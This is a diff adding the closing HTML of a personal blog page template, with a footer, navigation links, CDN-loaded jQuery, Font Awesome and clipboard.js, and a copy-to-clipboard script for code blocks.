+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    z1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
